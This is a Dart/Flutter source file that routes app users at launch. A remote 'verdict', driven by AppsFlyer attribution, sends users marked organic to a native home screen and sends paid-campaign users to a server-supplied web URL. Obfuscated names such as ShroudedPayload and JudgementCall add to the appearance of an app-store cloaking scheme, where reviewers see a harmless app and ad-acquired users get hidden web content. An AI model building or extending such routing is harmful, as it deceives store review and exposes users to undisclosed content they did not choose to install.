// BridgeConductor — single entry point that produces a Berth.
//
// Decision tree (short form):
//   1. If TapResolver has a pending URL → PortalBerth(that URL).
//   2. Read TrailMemory:
//        • stayPut → HomeBerth (short-circuit, no verdict call).
//        • opened  → either serve the cached destination or re-ask verdict.
//        • fresh   → run attribution + ask verdict.
//   3. If no reach → UnreachableBerth.
//
// Only the LaunchStage calls `decide()`. Everything the conductor needs
// (SignalVault, WaveSensor, OriginBeacon, JudgementCall) is wired in through
// the constructor so unit tests can stub them.
import 'dart:io' show Platform;

import 'package:flutter/foundation.dart'
    show PlatformDispatcher, debugPrint, kDebugMode;

import 'charts/shrouded_payload.dart';
import 'outcome/berth.dart';
import 'pipeline/bridge_courier.dart';
import 'pipeline/judgement_call.dart';
import 'pipeline/notice_stream.dart';
import 'pipeline/origin_beacon.dart';
import 'pipeline/signal_vault.dart';
import 'pipeline/tap_resolver.dart';
import 'pipeline/wave_sensor.dart';

class BridgeConductor {
  BridgeConductor({required this.applicationId})
      : courier = BridgeCourier(applicationId) {
    _origin = OriginBeacon(applicationId: applicationId, courier: courier);
    _judgement = JudgementCall(courier: courier);
  }

  final String applicationId;
  final BridgeCourier courier;
  late final OriginBeacon _origin;
  late final JudgementCall _judgement;

  OriginBeacon get origin => _origin;

  Future<Berth> decide() async {
    // Step 1 — pending push URL always wins.
    final pending = await TapResolver.consume();
    if (pending != null && pending.isNotEmpty) {
      final parsed = Uri.tryParse(pending);
      if (parsed != null &&
          (parsed.isScheme('http') || parsed.isScheme('https'))) {
        await SignalVault.writeTrail(TrailMemory.opened);
        _log('route=push pending=$pending');
        return PortalBerth(pending);
      }
    }

    final trail = await SignalVault.readTrail();
    _log('trail=$trail');
    if (trail == TrailMemory.stayPut) {
      _log('route=home (sticky trail)');
      return const HomeBerth();
    }

    // Step 2 — connectivity gate. UnreachableBerth is a soft stop that the
    // UnreachableWall screen can retry from without re-running the whole
    // boot pipeline (it just builds a fresh LaunchStage).
    if (!await WaveSensor.isReachable()) {
      _log('route=unreachable (no reach)');
      return const UnreachableBerth();
    }

    if (trail == TrailMemory.opened) {
      final cached = await SignalVault.readCachedDestination();
      if (cached != null) {
        _log('route=portal (cached) url=$cached');
        return PortalBerth(cached);
      }
      // Cached URL expired — fall through to a full verdict refresh.
    }

    // Step 3 — spin AppsFlyer up, wait for the attribution, then ask the
    // config endpoint for a verdict.
    await _origin.warmUp();
    final attribution = await _origin.captureAttribution();
    _log('attribution.size=${attribution.length} '
        'af_status=${attribution['af_status']} '
        'media_source=${attribution['media_source']} '
        'campaign=${attribution['campaign']}');

    final body = _origin.compose(
      bundleId: applicationId,
      platform: Platform.operatingSystem,
      storeHint: _storeHint(),
      locale: _locale(),
      pushToken: NoticeStream.instance.presence.token,
      firebaseProjectId: ShroudedPayload.pullMessagingProject().isNotEmpty
          ? ShroudedPayload.pullMessagingProject()
          : null,
    );
    // Merge in the raw attribution map so partner-side filters can look at
    // the campaign/pid/channel fields directly.
    body.addAll(attribution);
    _log('verdict.body.keys=${body.keys.toList()}');

    final berth = await _judgement.ask(body);
    _log('verdict.berth=$berth');

    switch (berth) {
      case PortalBerth():
        await SignalVault.writeTrail(TrailMemory.opened);
      case HomeBerth():
        // IMPORTANT: only lock the trail to stayPut if the attribution
        // explicitly declared the user as organic. Any other reason the
        // verdict came back empty (SDK still cold, verdict timeout, 5xx,
        // partner config glitch) is transient — retry on next boot.
        //
        // This closes the "sticky HomeBerth" trap: before this guard a
        // single bad verdict (empty attribution + partner default-reply)
        // would permanently route the user to the native shell even on
        // subsequent paid installs, because readTrail() short-circuited
        // the whole pipeline before any new verdict could be asked.
        final afStatus = (attribution['af_status']?.toString() ?? '')
            .toLowerCase()
            .trim();
        if (afStatus == 'organic') {
          await SignalVault.writeTrail(TrailMemory.stayPut);
          _log('trail→stayPut (declared organic)');
        } else {
          _log('trail stays fresh (af_status=$afStatus) — will re-ask next boot');
        }
      case UnreachableBerth():
        // JudgementCall never returns UnreachableBerth today, but keep the
        // branch so future changes don't silently fall through.
        break;
    }
    return berth;
  }

  String _storeHint() {
    if (Platform.isAndroid) return 'google_play';
    if (Platform.isIOS) return 'app_store';
    return 'unknown';
  }

  String _locale() {
    try {
      final loc = PlatformDispatcher.instance.locale;
      return '${loc.languageCode}_${loc.countryCode ?? ''}';
    } catch (_) {
      return 'en_US';
    }
  }

  void dispose() {
    courier.close();
  }

  void _log(String msg) {
    if (!kDebugMode) return;
    debugPrint('[bridge] $msg');
  }
}
